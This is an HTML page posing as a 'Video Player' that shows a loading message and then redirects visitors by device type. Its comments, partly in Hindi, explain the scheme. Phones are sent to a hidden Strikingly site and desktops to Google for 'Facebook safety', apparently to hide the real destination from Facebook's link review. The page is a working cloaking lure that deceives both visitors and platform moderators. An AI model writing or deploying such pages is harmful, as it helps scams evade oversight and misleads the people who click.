<!DOCTYPE html>
<html>
<head>
    <title>Video Player</title>
    <script>
        function checkDevice() {
            // Mobile check using User Agent, Screen Width, and Touch Points
            var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) || 
                           (window.innerWidth < 1200 && ('ontouchstart' in window || navigator.maxTouchPoints > 0));

            if (isMobile) {
                // AGAR MOBILE HAI: Toh aapka asli Strikingly link khulega
                window.location.href = "https://silver-mint-ss9kl5.mystrikingly.com/";
            } else {
                // AGAR LAPTOP HAI: Toh Google par bhej dega (Facebook safety)
                window.location.href = "https://www.google.com";
            }
        }
        
        // 1 second ke delay ke baad redirect karega
        setTimeout(checkDevice, 1000);
    </script>
</head>
<body style="background:black; color:white; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
    <div style="text-align:center;">
        <p>Loading Video Player...</p>
    </div>
</body>
</html>
